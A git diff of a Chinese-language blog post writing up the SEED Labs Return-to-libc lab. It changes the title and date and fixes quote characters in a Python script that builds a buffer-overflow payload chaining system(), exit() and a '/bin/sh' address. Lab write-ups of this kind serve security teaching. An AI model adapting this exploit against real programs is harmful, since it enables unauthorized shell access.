@@ -1,7 +1,7 @@
 ---
 layout: post
-title:  "【SEED Labs】Return-to-libc"
-date:   2021-07-10 00:00:00 +0800
+title:  "【SEED Labs】Return-to-libc Attack & ROP"
+date:   2021-07-14 00:00:00 +0800
 categories: 实验
 tags: SEEDLab 安全
 comments: 1
@@ -83,15 +83,15 @@ content = bytearray(0xaa for i in range(300))
 
 X = Y+8
 sh_addr = 0xffffd403 # The address of "/bin/sh"
-content[X:X+4] = (sh_addr).to_bytes(4,byteorder=’little’)
+content[X:X+4] = (sh_addr).to_bytes(4,byteorder='little')
 
 Y = 28
 system_addr = 0xf4e12420 # The address of system()
-content[Y:Y+4] = (system_addr).to_bytes(4,byteorder=’little’)
+content[Y:Y+4] = (system_addr).to_bytes(4,byteorder='little')
 
 Z = Y+4
 exit_addr = 0xf7e04f80 # The address of exit()
-content[Z:Z+4] = (exit_addr).to_bytes(4,byteorder=’little’)
+content[Z:Z+4] = (exit_addr).to_bytes(4,byteorder='little')
 
 # Save content to a file
 with open("badfile", "wb") as f:
